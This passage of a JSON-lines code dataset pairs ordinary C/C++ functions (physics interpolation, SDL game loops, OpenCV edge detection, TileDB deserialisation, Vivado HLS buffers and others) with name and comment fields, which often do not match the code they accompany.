(const int jj, const int kk, const int ll) noexcept\\n    {\\n        return src_arr.contains(jj,kk,ll) ? src_arr(jj,kk,ll) : 0.0_rt;\\n    };\\n\\n    \/\/ Avoid compiler warnings\\n#if (AMREX_SPACEDIM == 2)\\n    amrex::ignore_unused(noy, stencil_coeffs_y);\\n#endif\\n\\n    \/\/ Avoid compiler warnings\\n#ifndef WARPX_USE_PSATD\\n    amrex::ignore_unused(stencil_coeffs_x, stencil_coeffs_y, stencil_coeffs_z);\\n#endif\\n\\n    \/\/ Staggering (s = 0 if cell-centered, s = 1 if nodal)\\n    const int sj = src_stag[0];\\n    const int sk = src_stag[1];\\n#if (AMREX_SPACEDIM == 3)\\n    const int sl = src_stag[2];\\n#endif\\n\\n    \/\/ Number of points (+1) used for interpolation from the staggered grid to the nodal grid\\n    \/\/ (if the input field is nodal along a given direction, then s = 1, the variable n = 0\\n    \/\/ is actually never used, and there is no interpolation, only a copy of one single value)\\n    const int nj = (sj == 0) ? nox\/2 + 1 : 0;\\n#if   (AMREX_SPACEDIM == 2)\\n    const int nk = (sk == 0) ? noz\/2 + 1 : 0;\\n#elif (AMREX_SPACEDIM == 3)\\n    const int nk = (sk == 0) ? noy\/2 + 1 : 0;\\n    const int nl = (sl == 0) ? noz\/2 + 1 : 0;\\n#endif\\n\\n    \/\/ Additional normalization factor\\n    const amrex::Real wj = (sj == 0) ? 0.5_rt : 1.0_rt;\\n    const amrex::Real wk = (sk == 0) ? 0.5_rt : 1.0_rt;\\n#if   (AMREX_SPACEDIM == 2)\\n    constexpr amrex::Real wl = 1.0_rt;\\n#elif (AMREX_SPACEDIM == 3)\\n    const amrex::Real wl = (sl == 0) ? 0.5_rt : 1.0_rt;\\n#endif\\n\\n    \/\/ Auxiliary variables for stencil coefficients\\n#ifdef WARPX_USE_PSATD\\n    amrex::Real cj = 1.0_rt;\\n    amrex::Real ck = 1.0_rt;\\n    amrex::Real cl = 1.0_rt;\\n    int dj, dk;\\n#if (AMREX_SPACEDIM == 3)\\n    int dl;\\n#endif\\n#endif\\n\\n    \/\/ Min and max for interpolation loop along j\\n    const int jmin = (sj == 0) ? j - nj + 1 : j;\\n    const int jmax = (sj == 0) ? j + nj - 2 : j;\\n\\n    \/\/ Min and max for interpolation loop along k\\n    const int kmin = (sk == 0) ? k - nk + 1 : k;\\n    const int kmax = (sk == 0) ? k + nk - 2 : k;\\n\\n    \/\/ Min and max for interpolation loop along l\\n#if   (AMREX_SPACEDIM == 2)\\n    \/\/ l = 0 always\\n    const int lmin = l;\\n    const int lmax = l;\\n#elif (AMREX_SPACEDIM == 3)\\n    const int lmin = (sl == 0) ? l - nl + 1 : l;\\n    const int lmax = (sl == 0) ? l + nl - 2 : l;\\n#endif\\n\\n    amrex::Real res = 0.0_rt;\\n\\n#ifndef WARPX_USE_PSATD \/\/ FDTD (linear interpolation)\\n\\n    \/\/ Example of 1D interpolation from nodal grid to nodal grid:\\n    \/\/\\n    \/\/         j\\n    \/\/ --o-----o-----o--  result(j) = f(j)\\n    \/\/ --o-----o-----o--\\n    \/\/  j-1    j    j+1\\n    \/\/\\n    \/\/ Example of 1D interpolation from staggered grid to nodal grid:\\n    \/\/\\n    \/\/         j\\n    \/\/ --o-----o-----o--  result(j) = (f(j-1) + f(j)) \/ 2\\n    \/\/ -----x-----x-----\\n    \/\/     j-1    j\\n\\n    for (int ll = lmin; ll <= lmax; ll++)\\n    {\\n        for (int kk = kmin; kk <= kmax; kk++)\\n        {\\n            for (int jj = jmin; jj <= jmax; jj++)\\n            {\\n                res += src_arr_zeropad(jj,kk,ll);\\n            }\\n        }\\n    }\\n\\n#else \/\/ PSATD (finite-order interpolation)\\n\\n    \/\/ Example of 1D interpolation from nodal grid to nodal grid:\\n    \/\/\\n    \/\/         j\\n    \/\/ --o-----o-----o--  result(j) = f(j)\\n    \/\/ --o-----o-----o--\\n    \/\/  j-1    j    j+1\\n    \/\/\\n    \/\/ Example of 1D interpolation from staggered grid to nodal grid:\\n    \/\/\\n    \/\/                     j\\n    \/\/ --o-----o-----o-----o-----o-----o-----o--  result(j) = c_0 * (f(j-1) + f(j)  ) \/ 2\\n    \/\/ -----x-----x-----x-----x-----x-----x-----            + c_1 * (f(j-2) + f(j+1)) \/ 2\\n    \/\/     j-3   j-2   j-1    j    j+1   j+2                + c_2 * (f(j-3) + f(j+2)) \/ 2\\n    \/\/     c_2   c_1   c_0   c_0   c_1   c_2                + ...\\n\\n    for (int ll = lmin; ll <= lmax; ll++)\\n    {\\n#if (AMREX_SPACEDIM == 3)\\n        dl = (l - ll > 0) ? l - ll - 1 : ll - l;\\n        if (sl == 0) cl = stencil_coeffs_z[dl];\\n#endif\\n        for (int kk = kmin; kk <= kmax; kk++)\\n        {\\n            dk = (k - kk > 0) ? k - kk - 1 : kk - k;\\n#if   (AMREX_SPACEDIM == 2)\\n            if (sk == 0) ck = stencil_coeffs_z[dk];\\n#elif (AMREX_SPACEDIM == 3)\\n            if (sk == 0) ck = stencil_coeffs_y[dk];\\n#endif\\n            for (int jj = jmin; jj <= jmax; jj++)\\n            {\\n                dj = (j - jj > 0) ? j - jj - 1 : jj - j;\\n                if (sj == 0) cj = stencil_coeffs_x[dj];\\n\\n                res += cj * ck * cl * src_arr_zeropad(jj,kk,ll);\\n            }\\n        }\\n    }\\n\\n#endif\\n\\n    dst_arr(j,k,l) = wj * wk * wl * res;\\n}'}","id":4724}
{"content":"{'function_name': 'RemoveDeviceByName', 'docstring': '\/\/ END PROTECTED CODE\\r', 'code': 'BOOL\\r\\nMarkDeviceForRemoval(\\r\\n    LPTSTR          pszDeviceName\\r\\n    )\\r\\n{\\r\\n\\r\\n    USES_CONVERSION;\\r\\n\\r\\n\\r\\n    DBG_FN(MarkDeviceForRemoval);\\r\\n\\r\\n    LIST_ENTRY * pentry;\\r\\n    LIST_ENTRY * pentryNext;\\r\\n\\r\\n    ACTIVE_DEVICE*   pActiveDevice = NULL;\\r\\n\\r\\n    BOOL        fRet = FALSE;\\r\\n\\r\\n    DBG_TRC((\"Requested marking of device (%S) for removal\",pszDeviceName));\\r\\n\\r\\n    \/\/ BEGIN PROTECTED CODE\\r\\n    {\\r\\n        TAKE_CRIT_SECT t(g_DeviceListSync);\\r\\n\\r\\n        for ( pentry  = g_DeviceListHead.Flink;\\r\\n              pentry != &g_DeviceListHead;\\r\\n              pentry  = pentryNext ) {\\r\\n\\r\\n            pentryNext = pentry->Flink;\\r\\n\\r\\n            pActiveDevice = CONTAINING_RECORD( pentry,ACTIVE_DEVICE ,m_ListEntry );\\r\\n\\r\\n            if ( pActiveDevice->m_dwSignature != ADEV_SIGNATURE ) {\\r\\n                ASSERT((\"Invalid device signature\", 0));\\r\\n                fRet = FALSE;\\r\\n                break;\\r\\n            }\\r\\n            TCHAR       *tszDeviceID = NULL;\\r\\n\\r\\n            tszDeviceID = W2T(pActiveDevice->GetDeviceID());\\r\\n            if (tszDeviceID) {\\r\\n                if (!::lstrcmp(pszDeviceName, tszDeviceID)) {\\r\\n\\r\\n                   \/\/ Mark device as being removed\\r\\n                   pActiveDevice->SetFlags(pActiveDevice->QueryFlags() | STIMON_AD_FLAG_REMOVING);\\r\\n                   fRet = TRUE;\\r\\n                   break;\\r\\n               }\\r\\n            }\\r\\n        }\\r\\n\\r\\n    }\\r\\n    \/\/ END PROTECTED CODE\\r\\n\\r\\n    return fRet;\\r\\n}'}","id":4725}
{"content":"{'function_name': 'Ordering', 'docstring': '\/\/L[0] \u00e8 il valore minimo degli L', 'code': 'std::array<int,N_cities> PairPerm (std::array<int,N_cities> cromo) {\\n\\n  int gene1= rand()%(N_cities-1) +1;\\t\\t\/\/Scelgo due geni distinti da 2,....,N\\n  int gene2= rand()%(N_cities-1) +1;\\n  while(gene2==gene1) gene2= rand()%(N_cities-1) +1;\\n  int temp=cromo[gene1];\\n  cromo[gene1]=cromo[gene2];\\n  cromo[gene2]=temp;\\n  if(Check(cromo)==false) cout << \"Errore nella mutazione: PairPerm!\" <<endl;\\n  return cromo;\\n}'}","id":4726}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ put your main code here, to run repeatedly:', 'code': 'int shortestpath(int x, int y)\\n{ \\n\\n  int c=0,d=0;\\n if(x<(m-1) && y<n)\\n {\\n  if(b[x+1][y] != 0)\\n  {\\n    minimum = b[x+1][y];\\n    c=x+1;\\n    d=y;\\n  }\\n }\\n\\n if(x>0 && y>-1)\\n {\\n  if((b[x-1][y]< minimum )&& (b[x-1][y] != 0 ))\\n  {\/\/Serial.println(\"abcd\");\\n     minimum = b[x-1][y];\\n     c = x-1;\\n     d= y; \\n  }\\n }\\n\\n \\n if(x<m && y<(n-1))\\n {\\n   if((b[x][y+1]< minimum )&& (b[x][y+1] != 0 ))\\n  {\\n     minimum = b[x][y+1];\\n     c = x;\\n     d= y+1; \\n  }\\n }\\n\\n if(x>-1 && y>0)\\n {\\n   if((b[x][y-1]< minimum )&& (b[x][y-1] != 0 ))\\n  {\/\/Serial.println(\"sdfgh\");\\n     minimum = b[x][y-1];\\n     c = x;\\n     d= y-1; \\n  }\\n }\\n\\n stackdata = 100*c+d;\\n\/\/ Serial.println(stackdata);\\n s.push(stackdata);\\n\\n if(b[x][y]== minimum)\\n {\\n\\n s.pop();\\n s.pop();\\n }\\n\\n b[x][y] = 500;\\n\\n\\n return 0;\\n \\n}'}","id":4728}
{"content":"{'function_name': 'test_string2', 'docstring': '\/\/c++11', 'code': \"int string2int(const string& str)\\n{\\n\\tint  val = 0;\\n\\tstring::const_iterator it = str.begin();\/\/\u53c2\u6570\u662fconst\\n\\twhile (it != str.end())\\n\\t{\\n\\t\\tval *= 10;\\n\\t\\tval += (*it - '0');\\n\\t\\t++it;\\n\\t}\\n\\treturn val;\\n}\"}","id":4734}
{"content":"{'function_name': 'load_files', 'docstring': '\/\/if problem', 'code': 'int main( int argc, char* args[] )\\n{\\n     bool quit = false;\\n     \\n     int frame = 0;\\n     \\n     bool cap = true;\\n     \\n     Timer fps;\\n     Timer update;\\n     \\n     \\n     \\n     if( init() == false )\\n         return 1;\\n     \\n     if( load_files() == false )\\n         return 1;\\n     \/\/set_clips();\\n     Dot myDot;\\n     \\n     update.start();\\n     \\n     while( quit == false)\\n     {\\n            fps.start();\\n            while( SDL_PollEvent(&event) )\\n            {\\n                   myDot.handle_input();\\n                                  \\n                   if( event.type == SDL_QUIT )\\n                       quit = true;\\n            }\\n            \\n            myDot.move();\\n            myDot.set_camera();\\n            \/\/std::stringstream fpsm;\\n            \/\/fpsm << \"FPS: \" << frame \/ ( fps.get_ticks() \/ 1000.f );\\n            apply_surface( 0, 0, background, screen, &camera );\\n            \/\/SDL_FillRect( screen, &screen->clip_rect, SDL_MapRGB( screen->format, 0xFF, 0xFF, 0xFF ) );\\n            myDot.show();\\n            \\n            if( update.get_ticks() > 1000.f )\\n            {\\n                \\n                std::stringstream fpsm;\\n                \\n                fpsm << \"FPS: \" <<  ( frame );\\n                fpsmessage = TTF_RenderText_Solid(font, fpsm.str().c_str(), textColor );\\n                \\n                frame = 0;\\n                update.start();\\n            }\\n            apply_surface( 10, 10, fpsmessage, screen);\\n            if( SDL_Flip( screen ) == -1 )\\n                return 1;\\n            \\n            frame++;\\n            if( ( ( fps.get_ticks() ) < 1000 \/ FRAMES_PER_SECOND ) )\\n                SDL_Delay( ( 1000 \/ FRAMES_PER_SECOND ) - ( fps.get_ticks() ) );\\n                \\n            \\n        \\n     }\\n     \\n     clean_up();\\n     return 0;\\n}'}","id":4744}
{"content":"{'function_name': 'randint', 'docstring': '\/* 0 <= N < MAX *\/', 'code': 'void skip_to_int() {\\r\\n\\t\\r\\n\\t\/* Reads from standard input until an integer character is found *\/\\r\\n\\t\/* (Copied from sample code provided in \"Errors, Part 2\" lecture notes) *\/\\r\\n\\t\\r\\n\\tif ( cin.fail() ) {                       \/\/ We found something that isn\\'t an integer\\r\\n   \\r\\n\\t\\tcin.clear();                          \/\/ We\\'d like to look at the characters\\r\\n\\t\\tchar ch;\\r\\n      \\r\\n\\t\\twhile ( cin >> ch ) {                 \/\/ Throw away non-digit characters\\r\\n      \\r\\n\\t\\t\\tif ( isdigit(ch) || ch == \\'-\\' ) { \/\/ We found a digit or a \\'-\\'\\r\\n         \\t\\r\\n\\t\\t\\t\\tcin.unget();                  \/\/ Put the digit back so we can read it\\r\\n\\t\\t\\t\\treturn;\\r\\n            \\r\\n\\t\\t\\t}\\r\\n         \\r\\n\\t\\t}\\r\\n      \\r\\n\\t}\\r\\n   \\r\\n\\tthrow runtime_error(\"No input!\");         \/\/ eof() or bad(): give up\\r\\n   \\r\\n}'}","id":4760}
{"content":"{'function_name': 'Distance', 'docstring': '\/\/ cerr << den2 << \" \" << den << \" \" << denR << endl;', 'code': 'DAG ComputeDAG(const Graph &graph, int src_v) {\\n  DAG dag(graph.size());\\nqueue<Edge> que;\\n\/\/ stack<Edge> que;\\n  que.push({src_v, 0});\\n\\n  rep (iter, FLAGS_search_limit) {\\n    if (que.empty()) break;\\n    Edge crr = que.front();\\n    que.pop();\\n\\n    if (crr.second == 1) {\\n      printf(\"%d -> %d\\\\n\", src_v, crr.first);\\n      EnumeratePaths(dag, crr);\\n    }\\n\/\/ if (iter % 1000 == 0) cerr << src_v << \" \" << iter << \": \" << static_cast<double>(crr.second) << endl;\\n\\n    for (const auto &e : graph[crr.first]) {\\n      Edge nxt(e.first, crr.second + e.second);\\n      if (nxt.second > 1) continue;\\n\\n      auto &v = dag[nxt.first][nxt.second];\\n      if (v.empty()) que.push(nxt);\\n      v.emplace_back(crr);\\n    }\\n  }\\n\\n  return dag;\\n}'}","id":4763}
{"content":"{'function_name': 'IsFull', 'docstring': '\/*\u5224\u65ad\u961f\u5217\u662f\u5426\u6ee1\\n\\t\u961f\u5217\u6ee1\uff1a\u961f\u5c3e\u6307\u9488+1\u5c31\u4f1a\u4ece\u540e\u9762\u8d76\u4e0a\u961f\u5934\u6307\u9488\\n\\t*\/', 'code': 'bool AddQ(Queue Q, Vertex X) {\\n\\t\/*\\n\\t\u5165\u961f\\n\\t*\/\\n\\tif (IsFull(Q)) {\\n\\t\\tprintf(\"\u961f\u5217\u6ee1\\\\n\");\\n\\t\\treturn false;\\n\\t}\\n\\telse {\\n\\t\\tQ->Rear = (Q->Rear + 1) % Q->MaxSize;\\n\\t\\tQ->Data[Q->Rear] = X;\\n\\t\\treturn true;\\n\\t}\\n}'}","id":4764}
{"content":"{'function_name': 'GetDiscRecorder', 'docstring': '\/\/ all other cleanup', 'code': 'HRESULT ListAllRecorders()\\n{\\n    HRESULT hr = S_OK;\\n    LONG          index = 0;\\n    IDiscMaster2* tmpDiscMaster = NULL;\\n\\n    \/\/ create a disc master object\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = CoCreateInstance(CLSID_MsftDiscMaster2,\\n                              NULL, CLSCTX_ALL,\\n                              IID_PPV_ARGS(&tmpDiscMaster)\\n                             );\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed CoCreateInstance\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n    \/\/ Get number of recorders\\n    if (SUCCEEDED(hr))\\n    {\\n        hr = tmpDiscMaster->get_Count(&index);\\n\\n        if (FAILED(hr))\\n        {\\n            printf(\"Failed to get count\\\\n\");\\n            PrintHR(hr);\\n        }\\n    }\\n\\n    \/\/ Print each recorder\\'s ID\\n    for (LONG i = 0; i < index; i++)\\n    {\\n        IDiscRecorder2* discRecorder = NULL;\\n\\n        hr = GetDiscRecorder(i, &discRecorder);\\n\\n        if (SUCCEEDED(hr))\\n        {\\n\\n            BSTR discId;\\n            BSTR venId;\\n\\n            \/\/ Get the device strings\\n            if (SUCCEEDED(hr))\\n            {\\n                hr = discRecorder->get_VendorId(&venId);\\n            }\\n            if (SUCCEEDED(hr))\\n            {\\n                hr = discRecorder->get_ProductId(&discId);\\n            }\\n            if (FAILED(hr))\\n            {\\n                printf(\"Failed to get ID\\'s\\\\n\");\\n                PrintHR(hr);\\n            }\\n\\n            if (SUCCEEDED(hr))\\n            {\\n                printf(\"Recorder %d: %ws %ws\", i, venId, discId);\\n            }\\n            \/\/ Get the mount point\\n            if (SUCCEEDED(hr))\\n            {\\n                SAFEARRAY * mountPoints = NULL;\\n                hr = discRecorder->get_VolumePathNames(&mountPoints);\\n                if (FAILED(hr))\\n                {\\n                    printf(\"Unable to get mount points, failed\\\\n\");\\n                    PrintHR(hr);\\n                }\\n                else if (mountPoints->rgsabound[0].cElements == 0)\\n                {\\n                    printf(\" (*** NO MOUNT POINTS ***)\");\\n                }\\n                else\\n                {\\n                    VARIANT* tmp = (VARIANT*)(mountPoints->pvData);\\n                    printf(\" (\");\\n                    for (ULONG j = 0; j < mountPoints->rgsabound[0].cElements; j++)\\n                    {\\n                        printf(\" %ws \", tmp[j].bstrVal);\\n                    }\\n                    printf(\")\");\\n                }\\n                SafeArrayDestroyDataAndNull(mountPoints);\\n            }\\n            \/\/ Get the media type\\n            if (SUCCEEDED(hr))\\n            {\\n                IDiscFormat2Data* dataWriter = NULL;\\n\\n                \/\/ create a DiscFormat2Data object\\n                if (SUCCEEDED(hr))\\n                {\\n                    hr = CoCreateInstance(CLSID_MsftDiscFormat2Data,\\n                                          NULL, CLSCTX_ALL,\\n                                          IID_PPV_ARGS(&dataWriter)\\n                                         );\\n                    if (FAILED(hr))\\n                    {\\n                        printf(\"Failed CoCreateInstance on dataWriter\\\\n\");\\n                        PrintHR(hr);\\n                    }\\n                }\\n\\n                if (SUCCEEDED(hr))\\n                {\\n                    hr = dataWriter->put_Recorder(discRecorder);\\n                    if (FAILED(hr))\\n                    {\\n                        printf(\"Failed dataWriter->put_Recorder\\\\n\");\\n                        PrintHR(hr);\\n                    }\\n                }\\n                \/\/ get the current media in the recorder\\n                if (SUCCEEDED(hr))\\n                {\\n                    IMAPI_MEDIA_PHYSICAL_TYPE mediaType = IMAPI_MEDIA_TYPE_UNKNOWN;\\n                    hr = dataWriter->get_CurrentPhysicalMediaType(&mediaType);\\n                    if (SUCCEEDED(hr))\\n                    {\\n                        printf(\" (%s)\", g_MediaTypeStrings[mediaType]);\\n                    }\\n                }\\n                ReleaseAndNull(dataWriter);\\n            }\\n\\n            printf(\"\\\\n\");\\n            FreeSysStringAndNull(venId);\\n            FreeSysStringAndNull(discId);\\n\\n        }\\n        else\\n        {\\n            printf(\"Failed to get drive %d\\\\n\", i);\\n        }\\n\\n        ReleaseAndNull(discRecorder);\\n\\n    }\\n\\n    return hr;\\n}'}","id":4766}
{"content":"{'function_name': 'Max_deal_pic', 'docstring': '\/\/ \u5229\u7528\u6700\u503c\u753b\u51fa\u5bf9\u5e94\u7684\u7ad6\u7ebf', 'code': 'vector<int> min_edge_out(const Mat& image,int threshold)\\n{\\n    \/\/    string path = \"\/home\/explore\/data\/28\/18149.png\";\\n\/\/    Mat image = imread(path);\\n    Mat gray_image;\\n    \/\/ \u7070\u5ea6\u8f6c\u6362\\n    cvtColor(image,gray_image,CV_BGR2GRAY);\\n    \/\/ \u9ad8\u65af\u6ee4\u6ce2\\n    Size kernel_size(5,5);\\n    Mat blur;\\n    GaussianBlur(gray_image,blur,kernel_size,11);\\n    \/\/ \u4e8c\u503c\u5316\\n    Mat binary;\\n    cv::threshold(blur, binary, threshold, 255, CV_THRESH_BINARY);\\n    \/\/ \u81a8\u80c0\\n    Mat dilate_element = getStructuringElement(MORPH_RECT,\\n                                               Size(15, 15));\\n    Mat dilate_pic;\\n    dilate(binary,dilate_pic,dilate_element);\\n    \/\/ \u95ed\u8fd0\u7b97\\n    Mat close_element = getStructuringElement(MORPH_RECT,\\n                                              Size(17, 17));\\n    Mat morphology_pic;\\n    morphologyEx(dilate_pic, morphology_pic, MORPH_CLOSE,close_element);\\n    \/\/ \u67e5\u627e\u8fb9\u754c\\n    vector<vector<Point>> contours;\\n    vector<Vec4i> hierarchy;\\n    findContours(morphology_pic,contours,hierarchy,RETR_TREE,CHAIN_APPROX_SIMPLE);\\n    \/\/    cv::Rect stRect;\\n    \/\/ \u5904\u7406\u8fb9\u7f18\u6570\u7ec4\\n    vector<int> my_x;\\n    for(int i = 0;i<contours.size();i++)\\n    {\\n        for(int j = 0 ;j<contours[i].size();j++)\\n        {\\n            int x = contours[i][j].x;\\n            my_x.push_back(x);\\n        }\\n    }\\n\\n    if(!my_x.empty()){\\n        double sum = std::accumulate(begin(my_x),end(my_x),0.0);\\n        double mean = sum\/my_x.size();\\n        int count = 0;\\n        for(auto & value:my_x){\\n            if(value<mean){\\n                count++;\\n            }\\n        }\\n\/\/        cout<<\"count: \"<<count<<endl;\\n\\n        vector<int>::iterator p = max_element(my_x.begin(), my_x.begin()+count);\\n\\n        int max_per_c = *p;\\n        int min_rear_c;\\n        if(count == my_x.size()){\\n            min_rear_c = 255;\\n        }else{\\n            vector<int>::iterator q = min_element( my_x.begin()+count,my_x.end());\\n            min_rear_c = *q;\\n        }\\n\\n        vector<int> x_min = {max_per_c, min_rear_c};\\n\/\/        cout<<\"x_min: \"<<max_per_c<<\"  \"<<min_rear_c<<endl;\\n\\n        return x_min;\\n    }else{\\n        vector<int> x_min = {-1, -1};\\n\/\/        cout<<\"x_min: \"<<x_min[0]<<\"  \"<<x_min[1]<<endl;\\n\\n        return x_min;\\n    }\\n\\n    \/\/    cout<<\"max: \"<<max_per_c<<endl;\\n    \/\/    cout<<\"min: \"<<min_rear_c<<endl;\\n\\n    \/\/    rectangle(max_image,Point(max_per_c,10),Point(min_rear_c,10),cv::Scalar(0,255,0),3);\\n    \/\/    cv::rectangle(max_image, Point (max_per_c, 0), Point (max_per_c, image.rows),\\n    \/\/                  cv::Scalar(0, 200, 0), 2, 8, 0);\\n    \/\/    cv::rectangle(max_image, Point (min_rear_c, 0), Point (min_rear_c, image.rows),\\n    \/\/                  cv::Scalar(0, 200, 0), 2, 8, 0);\\n    \/\/ \/\/ \u5c06\u6700\u5c0f\u76f4\u5f84\u7684\u4e24\u4e2a\u6a2a\u5750\u6807\u8fd4\u56de\\n\\n\\n}'}","id":4768}
{"content":"{'function_name': 'Handler', 'docstring': '\/\/ \u6ca1\u6709\u540d\u5b57\\r', 'code': 'bool Handler(const Food& food, void* ctx, std::string&) override\\r\\n        {\\r\\n            Ctx(ctx)->m_stackIdent.emplace_back(food.Begin(), food.End()); \/\/ StrRef \u7c7b\u578b\\r\\n            return true;\\r\\n        }'}","id":4770}
{"content":"{'function_name': 'subarray_to_capnp', 'docstring': \"\/\/ If stats object exists set its cap'n proto object\", 'code': \"Status subarray_from_capnp(\\n    const capnp::Subarray::Reader& reader, Subarray* subarray) {\\n  RETURN_NOT_OK(subarray->set_coalesce_ranges(reader.getCoalesceRanges()));\\n  auto ranges_reader = reader.getRanges();\\n  uint32_t dim_num = ranges_reader.size();\\n  for (uint32_t i = 0; i < dim_num; i++) {\\n    auto range_reader = ranges_reader[i];\\n    Datatype type = Datatype::UINT8;\\n    RETURN_NOT_OK(datatype_enum(range_reader.getType(), &type));\\n\\n    auto data = range_reader.getBuffer();\\n    auto data_ptr = data.asBytes();\\n    if (range_reader.hasBufferSizes()) {\\n      auto ranges = range_buffers_from_capnp(range_reader);\\n      RETURN_NOT_OK(subarray->set_ranges_for_dim(i, ranges));\\n\\n      \/\/ Set default indicator\\n      subarray->set_is_default(i, range_reader.getHasDefaultRange());\\n    } else {\\n      \/\/ Handle 1.7 style ranges where there is a single range with no sizes\\n      Range range(data_ptr.begin(), data.size());\\n      RETURN_NOT_OK(subarray->set_ranges_for_dim(i, {range}));\\n      subarray->set_is_default(i, range_reader.getHasDefaultRange());\\n    }\\n  }\\n\\n  if (reader.hasLabelRanges()) {\\n    subarray->add_default_label_ranges(dim_num);\\n    auto label_ranges_reader = reader.getLabelRanges();\\n    uint32_t label_num = label_ranges_reader.size();\\n    for (uint32_t i = 0; i < label_num; i++) {\\n      auto label_range_reader = label_ranges_reader[i];\\n      auto dim_id = label_range_reader.getDimensionId();\\n      auto label_name = label_range_reader.getName();\\n\\n      \/\/ Deserialize ranges for this dim label\\n      auto range_reader = label_range_reader.getRanges();\\n      auto ranges = range_buffers_from_capnp(range_reader);\\n\\n      \/\/ Set ranges for this dim label on the subarray\\n      subarray->set_label_ranges_for_dim(dim_id, label_name, ranges);\\n    }\\n  }\\n\\n  if (reader.hasAttributeRanges()) {\\n    std::unordered_map<std::string, std::vector<Range>> attr_ranges;\\n    auto attr_ranges_reader = reader.getAttributeRanges();\\n    if (attr_ranges_reader.hasEntries()) {\\n      for (auto attr_ranges_entry : attr_ranges_reader.getEntries()) {\\n        auto range_reader = attr_ranges_entry.getValue();\\n        auto key = std::string_view{\\n            attr_ranges_entry.getKey().cStr(),\\n            attr_ranges_entry.getKey().size()};\\n        attr_ranges[std::string{key}] = range_buffers_from_capnp(range_reader);\\n      }\\n    }\\n\\n    for (const auto& attr_range : attr_ranges)\\n      subarray->set_attribute_ranges(attr_range.first, attr_range.second);\\n  }\\n\\n  \/\/ If cap'n proto object has stats set it on c++ object\\n  if (reader.hasStats()) {\\n    stats::Stats* stats = subarray->stats();\\n    \/\/ We should always have a stats here\\n    if (stats != nullptr) {\\n      RETURN_NOT_OK(stats_from_capnp(reader.getStats(), stats));\\n    }\\n  }\\n\\n  if (reader.hasRelevantFragments()) {\\n    auto relevant_fragments = reader.getRelevantFragments();\\n    size_t count = relevant_fragments.size();\\n    std::vector<unsigned> rf;\\n    rf.reserve(count);\\n    for (size_t i = 0; i < count; i++) {\\n      rf.emplace_back(relevant_fragments[i]);\\n    }\\n\\n    subarray->relevant_fragments() = RelevantFragments(rf);\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":4774}
{"content":"{'function_name': 'demosaicb_rd8_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd9_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd9 read pattern: { demosaicb_update_0[d0, d1] -> denoise[2d0, -1 + d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 1927 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write0 = denoise.denoise_denoise_update_0_write0_merged_banks_9.peek_1927();\\n  return value_denoise_denoise_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4775}
{"content":"{'function_name': 'SDLSoundCheck', 'docstring': '\/\/    if (nAudDSPModule) DspDo(nAudNextSound, nAudSegLen);\\r', 'code': 'static int SDLSoundExit() {\\r\\n\\t\/\/dprintf(_T(\"SDLSoundExit\\\\n\"));\\r\\n    \\r\\n    free(nAudNextSound);\\r\\n\\tnAudNextSound = NULL;\\r\\n    \\r\\n    for (int i=0;i<nAudSegCount;i++) {\\r\\n        free(buffer_ana[i]);\\r\\n    }    \\r\\n    free((void*)buffer_ana_flag);\\r\\n    free(buffer_ana);\\r\\n    \\r\\n    \\r\\n    for (int i=0; i<nAudSegCount; i++) {\\r\\n\\t\\tAudioQueueFreeBuffer( mAudioQueue, mBuffers[i] );\\t\\t\\r\\n    }\\r\\n    free(mBuffers);\\r\\n    \\r\\n    \\r\\n\\treturn 0;\\r\\n}'}","id":4777}
{"content":"{'function_name': 'denoiseb_rd40_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd41_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd41 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, -1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2895 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (1934 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_2895();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4779}
